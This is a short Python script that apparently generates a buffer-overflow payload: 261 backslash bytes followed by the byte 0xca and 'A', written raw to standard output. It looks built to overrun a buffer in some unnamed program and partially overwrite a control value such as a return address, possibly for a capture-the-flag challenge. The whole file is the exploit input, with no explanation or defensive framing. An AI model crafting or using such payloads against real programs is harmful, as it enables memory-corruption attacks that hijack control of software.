#!/usr/bin/python3
import sys


payload =  b'\\' * 261
payload += b'\xca'
payload += b'A'


sys.stdout.buffer.write(payload)
# print(payload.decode())
